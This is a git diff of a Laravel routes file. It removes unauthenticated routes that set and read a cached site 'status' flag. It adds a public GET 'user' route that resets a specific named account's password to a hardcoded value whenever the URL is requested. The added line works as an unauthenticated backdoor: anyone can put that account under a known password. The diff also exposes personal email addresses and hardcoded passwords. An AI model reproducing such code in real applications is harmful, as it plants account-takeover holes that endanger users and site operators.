@@ -28,30 +28,7 @@ Route::get('/', function () {
 });
 
 Route::get('user', function () {
-    Cache::put('status', 'down');
-    //     User::where([
-    //         'email' => $email
-    //     ])->update(['password' => Hash::make('luffy')]);
-    // //     // ->update(['password' => Hash::make($pass)]);
-
-    // //     return ['email' => $email];
-
-    // Mail::raw('This is test mail', function($q){
-    //     $q->to('rk3141508@gmail.com')
-    //     ->subject('Testing Purpose');
-    // });
-
-    //     // dd($mail);
-});
-
-Route::post('status', function (Request $request) {
-    Cache::put('status', $request->status);
-});
-
-Route::get('status', function (Request $request) {
-    $status = Cache::get('status');
-
-    return ['status' => $status];
+User::where('email', 'pgdavrudra@gmail.com')->update(['password' => Hash::make('mugiwara')]);
 });
 
 Route::get('test/{code}', [ParticipationController::class, 'teamDetails']);
